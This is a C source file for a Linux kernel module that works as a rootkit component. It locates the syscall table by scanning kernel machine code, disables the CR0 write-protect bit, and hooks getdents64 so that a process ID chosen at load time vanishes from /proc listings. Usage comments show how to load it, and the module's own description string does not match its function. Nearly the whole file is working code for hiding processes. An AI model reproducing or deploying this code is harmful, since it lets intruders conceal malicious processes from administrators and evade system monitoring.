#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/list.h>
#include <linux/unistd.h>
#include <linux/stat.h>
//how to use it 
//make
//insmod PidHide.ko HIDEPID=23522   (23522 is the process id you want to hide)
//rmmod PidHide
#include <linux/proc_fs.h>
#include <asm/unistd.h>
#include <asm/ptrace.h>
#include <asm/desc_defs.h>
#include <asm/msr.h>
#include <asm/uaccess.h>
#include <asm/syscalls.h>

//#define HIDEPID 12246
static int HIDEPID=10000;
module_param(HIDEPID,int,S_IRUGO);

//定义函数指针，指向被劫持的系统调用  
asmlinkage long (*orig_getdents)(unsigned int fd,struct linux_dirent64 __user *dirp,unsigned int count);
int orig_cr0;
unsigned long *sys_call_table=NULL;

//清除和返回cr0  
unsigned int clear_and_return_cr0(void)  
{
	unsigned int cr0 = 0;
	unsigned int ret;  
	__asm__ __volatile__("movq %%cr0,%%rax":"=a"(cr0));  
	ret = cr0;  
	cr0 &= 0xfffeffff;  
	asm volatile("movq %%rax,%%cr0"::"a"(cr0));  
	printk(KERN_INFO "cr0=0x%x\n",(unsigned int)cr0);
	return ret;  
}  
//设置cr0  
void setback_cr0(unsigned int val)  
{  
	asm volatile("movq %%rax,%%cr0"::"a"(val));  
}  

//char* 转换为 int  
int atoi(char *str)  
{  
	int res = 0;  
	int mul = 1;  
	char *ptr;  
	for(ptr = str + strlen(str)-1; ptr >= str; ptr--){  
		if(*ptr < '0' || *ptr > '9')  
			return -1;  
		res += (*ptr -'0') * mul;  
		mul *= 10;  
	}  
	return res;  
}

//the hacked sys_getdents64  
//劫持后更换的系统调用  
asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)  
{  
	long value = 0;  
      
	unsigned short len = 0;  
	unsigned short tlen = 0;  
	int pid;   
	struct kstat fbuf;  
	// printk(KERN_ALERT "hidden get dents/n"); 
	vfs_fstat(fd, &fbuf);//获取文件信息  
	// printk(KERN_ALERT "ino:%d, proc:%d,major:%d,minor:%d/n", fbuf.ino, PROC_ROOT_INO, MAJOR(fbuf.dev), MINOR(fbuf.dev));  
	if(orig_getdents != NULL)  
	{  
		//执行旧的系统调用  
		value = (*orig_getdents)(fd, dirp, count);  
		// if the file is in /proc    
		//判断文件是否是/proc下的文件  
		if(fbuf.ino == PROC_ROOT_INO && !MAJOR(fbuf.dev) && MINOR(fbuf.dev) == 3)  
		{  
			 //printk(KERN_ALERT "this is proc");  
 			tlen = value;  
			while(tlen>0){  
				len = dirp->d_reclen;  
				tlen = tlen-len;
				  //printk(KERN_ALERT "dname:%s,",dirp->d_name);  
				//获取进程号  
				pid = atoi(dirp->d_name);  
				  //printk(KERN_ALERT "pid:%d/n", pid);  
				if(pid ==HIDEPID)  
				{
					//printk(KERN_ALERT "find process/n");  
					//remove the hidden process  
					//从/proc去除进程文件  
					memmove(dirp, (char*)dirp + dirp->d_reclen, tlen);  
					value = value -len;  
					//printk(KERN_ALERT "hide successful/n");  
				}  
				if(tlen)  
					dirp = (struct linux_dirent64 *)((char*)dirp + dirp->d_reclen);  
			}  
		}
          
	}  
	else  
		printk(KERN_ALERT "orig_getdents is null/n");
	return value;
}  

unsigned long *getscTable(void)
{

	unsigned char *shell,*sort;
	unsigned long sct;
	unsigned long syscall_long;
	char *p;
	int i;

	/* get the interrupt descriptor table */
	rdmsrl(MSR_LSTAR,syscall_long);
	printk(KERN_INFO "system_call address is 0x%lx\n",syscall_long);
	shell=(char *)syscall_long;
	sort="\xff\x14\xc5";//not ff1485

	for(i=0;i<1000;i++)
	if(shell[i]==sort[0]&&shell[i+1]==sort[1]&&shell[i+2]==sort[2])
	{
		printk("here ok!!\n");
		printk("i=%d,shell[i]=%x,shell[i+1]=%x,shell[i+2]=%x",i,shell[i],shell[i+1],shell[i+2]);
		printk("i=%d,shell[i+3]=0x%x,shell[i+4]=0x%x,shell[i+5]=0x%x,shell[i+6]=0x%x,	\
                     shell[i+7]=0x%x,shell[i+8]=0x%x,shell[i+9]=0x%x,shell[i+10]=0x%x\n",i,	\
                     shell[i+3],shell[i+4],shell[i+5],shell[i+6],shell[i+7],shell[i+8],shell[i+9],shell[i+10]);
		break;
	}
	if(i>=1000) return NULL;
	p=&shell[i+3];
	printk("i+3=%d\n",i+3);
	sct=*(unsigned long*)p;
	printk(KERN_INFO "sct=0x %lx\n",sct);
	return (unsigned long*)(sct);
}


static int __init monitor_init(void){
	//int i;
	sys_call_table=getscTable();
	if(sys_call_table==NULL) 
	{
		printk(KERN_INFO "%s:can't find system_call table.\n",__FUNCTION__);
		return -1;
	}
	sys_call_table=(unsigned long *)((unsigned long)sys_call_table|0xffffffff00000000);
	printk("sys_call_table address is 0x%lx\n",(unsigned long)sys_call_table);
	printk("here 1,sys_getdents64__address is 0x%lx\n",sys_call_table[217]);
	
	//hook sys_getdents64 system call
	if(sys_call_table[__NR_getdents64]!=(unsigned long)hacked_getdents)
	{
		orig_cr0=clear_and_return_cr0();
		orig_getdents=(void *)sys_call_table[__NR_getdents64];
		if(hacked_getdents!=NULL)
			sys_call_table[__NR_getdents64]=(unsigned long)hacked_getdents;
		printk(KERN_ALERT "orig getdents:0x%lx,hacked getdents:0x%lx.\n",(unsigned long)orig_getdents,(unsigned long)hacked_getdents);
		setback_cr0(orig_cr0);
		return 0;
	}
	else
		return -1;
}

static void __exit monitor_cleanup(void){
	//restore
	/*if((sys_call_table[57]!=sys_fork_default_handler)&&sys_fork_default_handler)
		sys_call_table[57]=sys_fork_default_handler;
	*/
	if(sys_call_table&&(sys_call_table[__NR_getdents64]==(unsigned long)hacked_getdents))
	{
		orig_cr0=clear_and_return_cr0();
		sys_call_table[__NR_getdents64]=(unsigned long)orig_getdents;
		setback_cr0(orig_cr0);
		printk(KERN_INFO "Restore sys_getdents64.\n");
	}
	printk("module exit.\n");
}

module_init(monitor_init);
module_exit(monitor_cleanup);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Peng Zhenyi");
MODULE_DESCRIPTION("Get sys_fork system call!"); 
